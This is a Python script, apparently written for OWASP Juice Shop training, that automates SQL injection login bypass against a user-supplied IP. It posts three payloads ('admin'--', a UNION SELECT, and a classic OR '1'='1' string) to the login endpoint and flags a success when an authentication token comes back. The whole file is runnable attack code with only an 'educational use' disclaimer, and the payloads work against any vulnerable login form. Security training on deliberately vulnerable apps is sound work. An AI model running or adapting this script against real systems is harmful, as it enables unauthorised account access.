#!/usr/bin/env python3
"""
SQL Injection Attack Script

This script tests a Juice Shop instance for common SQL injection vulnerabilities
in the login form.

For educational purposes only.
"""

import time

# "requests" is an optional runtime dependency for this utility script.
# Wrap the import so static analysis and environments without requests
# do not crash at import time. At runtime we check and report a helpful
# message if it's not present.
try:
    # Silence both pylint and Pylance/pyright when the package isn't available
    # in the current analysis environment. At runtime we still handle ImportError.
    import requests  # pylint: disable=import-error  # type: ignore[reportMissingModuleSource]
except ImportError:  # pragma: no cover - environment may not have requests installed
    requests = None

def test_sql_injection(target_ip, payload_username, payload_password):
    """
    Attempts a login with a given SQL injection payload.
    Returns a tuple of (success, message).
    """
    login_url = f"http://{target_ip}:3000/rest/user/login"

    payload = {
        "email": payload_username,
        "password": payload_password
    }

    headers = {
        "Content-Type": "application/json"
    }

    # If requests isn't available, fail early with a helpful message.
    if requests is None:
        return False, "requests library is not installed"

    success = False
    message = ""
    try:
        response = requests.post(login_url, json=payload, headers=headers, timeout=10)
        if response.status_code == 200:
            response_data = response.json()
            if "authentication" in response_data and "token" in response_data["authentication"]:
                success = True
                message = "SQL injection successful - bypassed login!"
            else:
                message = "Login response received but no token found"
        else:
            message = f"HTTP {response.status_code} - Login failed"

    except requests.exceptions.Timeout:
        message = "Request timeout"
    except requests.exceptions.ConnectionError:
        message = "Connection error"
    except requests.exceptions.RequestException as e:
        message = f"Error: {str(e)}"

    return success, message

def main():
    """Main function to run the SQL injection attack script."""
    print("SQL Injection Attack Script")
    print("Educational use only!")
    print("")

    target_ip = input("Enter Juice Shop IP address: ")

    print(f"Testing connection to {target_ip}:3000...")
    if requests is None:
        print("The 'requests' library is not installed.")
        print("Install it to run this script: pip install requests")
        return

    try:
        requests.get(f"http://{target_ip}:3000", timeout=5)
        print("Connection successful!")
    except requests.exceptions.RequestException:
        print("Cannot reach target. Make sure Juice Shop is running.")
        return

    print("\nTesting SQL injection payloads...\n")
    payloads = [
        {
            "name": "Admin bypass attempt",
            "username": "admin'--",
            "password": "anything"
        },
        {
            "name": "Union injection test",
            "username": "' UNION SELECT 1,'admin','password' --",
            "password": "test"
        },
        {
            "name": "Classic OR injection",
            "username": "' or '1'='1' --",
            "password": "' or '1'='1' --"
        }
    ]

    successful_attacks = []

    for i, payload in enumerate(payloads, 1):
        print(f"[{i}/{len(payloads)}] Testing: {payload['name']}")
        print(f"  Username: {payload['username']}")
        print(f"  Password: {payload['password']}")

        success, message = test_sql_injection(target_ip, payload['username'], payload['password'])

        if success:
            print(f"  Result: SUCCESS - {message}")
            successful_attacks.append(payload['name'])
        else:
            print(f"  Result: FAILED - {message}")

        print("")
        time.sleep(1)

    print("=== Attack Results ===")
    if successful_attacks:
        print(f"Successful SQL injections: {len(successful_attacks)}")
        for attack in successful_attacks:
            print(f"  ✓ {attack}")
        print("\nWARNING: Application is vulnerable to SQL injection!")
    else:
        print("No successful SQL injections found")
        print("Application may be protected against SQL injection")

    print("\nAttack finished.")

if __name__ == "__main__":
    main()
